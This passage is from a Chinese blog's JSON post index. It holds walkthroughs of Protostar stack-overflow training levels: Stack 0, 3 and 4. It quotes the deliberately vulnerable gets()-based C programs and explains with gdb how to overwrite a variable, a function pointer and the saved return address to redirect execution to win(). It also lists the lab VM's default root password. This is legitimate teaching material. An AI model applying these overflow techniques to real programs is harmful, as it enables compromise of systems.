3指令，使CPU执行到这一点时停下来。这便是软件调试中经常用到的断点（breakpoint）功能，因此INT 3指令又被称为断点指令。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出系列学习-Stack 1","date":"2016-04-15T03:12:19.000Z","path":"2016/04/15/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 0/","text":"0x00 序接着之前的系列，下面研究两种控制eip的方式 0x01 通过覆盖栈中的函数指针控制eipStack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP) Hints:both gdb and objdump is your friend you determining where the win() function lies in memory. 123456789101112131415161718192021222324#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win()&#123; printf(\"code flow successfully changed\\n\");&#125;int main(int argc, char **argv)&#123; volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) &#123; printf(\"calling function pointer, jumping to 0x%08x\\n\", fp); fp(); &#125;&#125; 在main函数下断点，分析可知，1处为fp的地址，2处为fp()的调用，我们需要覆盖掉esp+0x5c处所存的函数指针值，使其跳转到win()函数 利用Python编写exp测试脚本，可以发现QQQQ覆盖了函数指针 重新编写exp,将QQQQ改为win()函数的地址，即可实现自定义调用，控制eip 成功执行win()函数 0x02 通过ret指令控制eipStack4 takes a look at overwriting saved EIP and standard buffer overflows. This level is at /opt/protostar/bin/stack4 Hints:A variety of introductory papers into buffer overflows may help.gdb lets you do “run &lt; input”EIP is not directly after the end of buffer, compiler padding can also increase the size. 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void win()&#123; printf(\"code flow successfully changed\\n\");&#125;int main(int argc, char **argv)&#123; char buffer[64]; gets(buffer);&#125; 先分析一下，可以发现这个程序很简单，看上去没有可以直接控制eip的方法，但函数的调用过程在结束的时候会将保存的返回地址存在栈中，ret指令的时候会将传给eip。所以我们可以覆盖对应的返回地址值达到控制eip 123456789101112131415______________| | &lt;---esp--------------| 局部变量1 |--------------| 局部变量2 |--------------| ... |--------------| | &lt;---new ebp--------------| old ebp |--------------| 返回地址 | ret --------&gt; eip-------------- 和前面一样，这次我们之间利用Python编写exp测试脚本，可以发现SSSS覆盖了old ebp，TTTT覆盖了返回地址 我们查看win()的地址，重新编写对应exp，然后将TTTT改为其地址，成功达到目的。 成功执行win()函数","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/栈溢出/"}]},{"title":"Protostar-栈溢出系列学习-Stack 0","date":"2016-04-10T03:12:19.000Z","path":"2016/04/10/Protostar-栈溢出系列学习-Stack 0/Protostar-栈溢出系列学习-Stack 0/","text":"0x01 序为了加强自己在漏洞利用方面的能力，准备做一个栈溢出和堆溢出利用的系列学习，从最简单的栈溢出学习开始，学习平台是本地搭建的一个基于linux系统的Protostar学习虚拟机环境，里面有从易到难的示例溢出漏洞程序。那就开始吧！ 0x01 Protostar虚拟机环境搭建虚拟机下载地址 虚拟机环境搭建视频教程 默认用户名和密码: user:user root:godmode 虚拟机启动后，输入bash进入终端界面 漏洞程序在/opt/protostar/bin目录下 0x01 Protostar/Stack 0This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution. This level is at /opt/protostar/bin/stack0 123456789101112131415161718#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int main(int argc, char **argv)&#123; volatile int modified; char buffer[64]; modified = 0; gets(buffer); if(modified != 0) &#123; printf(\"you have changed the 'modified' variable\\n\"); &#125; else &#123; printf(\"Try again?\\n\"); &#125;&#125; 0x02 思路&amp;分析这个栈溢出很简单，首先在栈上分配了64字节大小的空间，然后根据modified的值来决定执行流程，但modified始终等于0。所以我们需要利用栈溢出去修改modified的值。 0x03 调试&amp;利用 gdb连接到stack0，下break *main在main函数上下断点，然后set disassembly-flavor intel设置intel汇编指令格式,在0x08048411出下个断点 利用define hook-stop在断点触发时观察栈变量和寄存器的值 123&gt;info registers &gt;x/24wx $esp&gt;end 由上图可以发现，当我们输入几个A后，0xbffff762地址已经被写入了0x41,然后我们再查看modified的值发现没有变化，通过计算发现为buffer偏移4+16*3+12字节出。 利用Python写入4+16*3+14字节数的A，发现成功修改modified的值，改变其执行流程。","tags":[{"name":"Linux","slug":"Linux","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Linux/"},{"name":"Protostar","slug":"Protostar","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/Protostar/"},{"name":"栈溢出","slug":"栈溢出","permalink":"https://github.com/NULL-ME/NULL-ME.github.io.git/tags/栈溢出/"}]}]